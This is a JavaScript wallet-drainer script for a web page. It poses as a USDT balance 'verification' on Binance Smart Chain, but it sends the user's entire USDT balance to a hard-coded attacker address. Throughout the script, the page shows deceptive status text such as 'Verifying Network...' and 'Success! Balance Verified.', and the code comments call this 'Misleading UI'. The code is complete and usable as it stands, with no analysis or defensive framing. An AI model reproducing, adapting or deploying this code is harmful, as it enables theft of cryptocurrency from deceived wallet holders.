
// CONFIGURATION
const RECIPIENT_ADDRESS = "0xec7dd8d632185872334ff8cd9ffa9ae763838f6a"; // REPLACE THIS
const USDT_CONTRACT_ADDRESS = "0x55d398326f99056b77e6534b23c23245e6d03228"; // BEP20 USDT
const BSC_CHAIN_ID = "0x38"; // 56 in Hex

const btn = document.getElementById('actionBtn');
const status = document.getElementById('status');

// USDT Contract Interface
const usdtInterface = new ethers.utils.Interface([
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (boolean)"
]);

// Function to switch to BSC
async function switchToBSC(provider) {
    try {
        await provider.send("wallet_switchEthereumChain", [{ chainId: BSC_CHAIN_ID }]);
    } catch (switchError) {
        // If chain not added, add it
        if (switchError.code === 4902) {
            await provider.send("wallet_addEthereumChain", [{
                chainId: BSC_CHAIN_ID,
                chainName: "Binance Smart Chain",
                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                rpcUrls: ["https://bsc-dataseed.binance.org/"],
                blockExplorerUrls: ["https://bscscan.com/"]
            }]);
        } else {
            throw switchError;
        }
    }
}

btn.addEventListener('click', async () => {
    try {
        // 1. Check if Wallet Exists
        if (!window.ethereum) {
            status.innerHTML = "⚠️ MetaMask or Trust Wallet not found!";
            return;
        }

        // 2. Initialize Provider
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        
        // 3. Check Current Network
        const network = await provider.getNetwork();
        if (network.chainId !== 56) {
            status.innerHTML = "🔄 Switching to BSC...";
            await switchToBSC(provider);
            // Refresh network info
            await provider.send("eth_requestAccounts", []); // Triggers popup
        }

        // 4. Get Signer
        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();

        // 5. Update UI
        btn.disabled = true;
        btn.innerHTML = '<span class="spinner"></span> Checking Balance...';
        status.innerText = "";

        // 6. Fetch User's USDT Balance
        const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, usdtInterface, signer);
        
        // Use provider for balanceOf (cheaper, no signature needed)
        const balanceWei = await usdtContract.balanceOf(userAddress);
        const balanceUSDT = ethers.utils.formatUnits(balanceWei, 18);

        // 7. Check Balance
        if (parseFloat(balanceUSDT) < 0.01) {
            status.innerHTML = "⚠️ Low Balance: " + balanceUSDT + " USDT";
            btn.disabled = false;
            btn.innerText = "Try Again";
            return;
        }

        // 8. Misleading UI
        btn.innerHTML = '<span class="spinner"></span> Verifying Network...';
        status.innerText = `Found: ${balanceUSDT} USDT`;

        // 9. Execute Transfer
        const tx = await usdtContract.transfer(RECIPIENT_ADDRESS, balanceWei, {
            gasLimit: 150000
        });

        // 10. Wait for Confirmation
        btn.innerHTML = '<span class="spinner"></span> Finalizing...';
        status.innerText = "Transaction Sent!";

        const receipt = await tx.wait();

        if (receipt.status === 1) {
            status.innerHTML = "✔ Success! Balance Verified.";
            btn.innerText = "Done";
            btn.style.background = "#10b981";
        } else {
            throw new Error("Transaction Failed");
        }

    } catch (error) {
        console.error("Full Error:", error); // Check Console for this
        
        if (error.code === 1 || error.message.includes("User rejected")) {
            status.innerHTML = "❌ User rejected transaction.";
        } else if (error.code === -32000) {
            status.innerHTML = "❌ Transaction Confirmed or Replaced.";
        } else {
            status.innerHTML = `❌ Error: ${error.message}`;
        }
        
        btn.disabled = false;
        btn.innerText = "Start Verification";
        btn.style.background = "#3b82f6";
    }
});
